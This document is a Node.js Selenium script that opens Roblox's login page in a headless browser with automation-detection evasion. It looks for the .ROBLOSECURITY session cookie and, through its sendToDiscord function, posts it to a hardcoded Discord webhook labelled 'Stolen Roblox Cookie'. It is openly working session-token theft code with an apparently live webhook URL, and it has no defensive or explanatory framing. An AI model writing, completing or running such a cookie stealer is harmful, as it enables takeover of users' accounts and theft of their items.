const { Builder, By, Key, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const fetch = require('node-fetch'); // Or use built-in node fetch if on Node 18+

// REPLACE WITH YOUR WEBHOOK URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1559507908339830915/1rF2lKbnmwqnLsaBoP5L88G2TxFMZBwwTUT4gYlKM47GCSTNQnqudCkhx5rFnJyG-iSP";

async function snatchCookie() {
    console.log("[Selenium] Starting browser...");
   
    let driver;
    try {
        driver = await new Builder()
            .forBrowser('chrome')
            .setChromeOptions(new chrome.Options()
                .addArguments('--headless=new') // Remove this line to see the browser window
                .addArguments('--disable-blink-features=AutomationControlled')
            )
            .build();

        // 1. Go to Roblox Login Page
        await driver.get('https://www.roblox.com/login');
       
        // 2. Wait for the page to load fully
        // We wait for the password input to appear.
        // If the user is ALREADY LOGGED IN, Roblox might redirect to /home or show the avatar menu.
        // So we check for EITHER the login form OR the main game navigation bar.
       
        const loginFormPresent = await driver.wait(
            async () => {
                try {
                    await driver.findElement(By.id('login-password'));
                    return true;
                } catch (e) {
                    return false;
                }
            },
            10000
        );

        const homePagePresent = await driver.wait(
            async () => {
                try {
                    // Check for elements that only exist when logged in (like the 'Home' nav button)
                    await driver.findElement(By.xpath("//button[contains(@class, 'nav-item')]"));
                    return true;
                } catch (e) {
                    return false;
                }
            },
            5000
        );

        if (loginFormPresent || homePagePresent) {
            console.log("[Selenium] User is logged in or page loaded.");
           
            // 3. Get Cookies
            const cookies = await driver.manage().getCookies();
           
            // Find the important cookie
            const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
           
            if (robloxCookie) {
                console.log("[Selenium] Cookie found!");
                await sendToDiscord(robloxCookie.value);
            } else {
                console.log("[Selenium] No .ROBLOSECURITY cookie found. Taking screenshot...");
                const screenshot = await driver.takeScreenshot();
                // Save locally for debugging
                require('fs').writeFileSync('debug_screenshot.png', screenshot, 'base64');
            }
        } else {
            console.log("[Selenium] Page didn't load correctly. Screenshotting...");
            const screenshot = await driver.takeScreenshot();
            require('fs').writeFileSync('error_screenshot.png', screenshot, 'base64');
        }

    } catch (error) {
        console.error("[Selenium] Error:", error.message);
    } finally {
        if (driver) {
            await driver.quit();
            console.log("[Selenium] Browser closed.");
        }
    }
}

async function sendToDiscord(cookieValue) {
    // Simple string concatenation to avoid ALL syntax errors
    const message = "Stolen Roblox Cookie: " + cookieValue;
   
    const payload = JSON.stringify({ content: message });

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload
        });
        console.log("[Discord] Sent successfully!");
    } catch (err) {
        console.error("[Discord] Send failed:", err);
    }
}

// Run it
snatchCookie();
